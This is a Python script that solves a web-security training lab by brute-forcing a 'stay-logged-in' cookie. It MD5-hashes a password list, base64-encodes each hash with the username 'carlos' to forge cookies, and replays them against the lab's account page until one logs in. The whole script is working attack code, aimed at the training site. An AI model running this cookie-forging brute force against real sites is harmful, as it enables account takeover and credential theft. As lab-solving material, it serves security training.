from listgen import *
import requests
import argparse
from hashlib import md5
from base64 import b64encode


parser = argparse.ArgumentParser(description='Solves the following Lab: Brute-forcing a stay-logged-in cookie')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

# GENERATE MD5 HASHED PASSWORDS
passwords = [i for i in passlist()]
hashed_passlist = []
for password in passwords:
    hashed_passlist.append(md5(password.encode()).hexdigest())

# FORGE COOKIES
headers = []
for hash in hashed_passlist:
    encoded_hash = b64encode(f'carlos:{hash}'.encode('ascii')).decode('ascii')
    headers.append({"Cookie":f"stay-logged-in={encoded_hash}"})

# BRUTE-FORCE LOGIN
for i,cookie in enumerate(headers, start=0):
    r = requests.post("https://" + lab.id + ".web-security-academy.net/my-account", headers=cookie)
    if "My Account" not in r.text:
        continue
    else:
        print(f"Found valid cookie: {cookie}")
        print(f"Password: {passwords[i]}")
        break

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab")
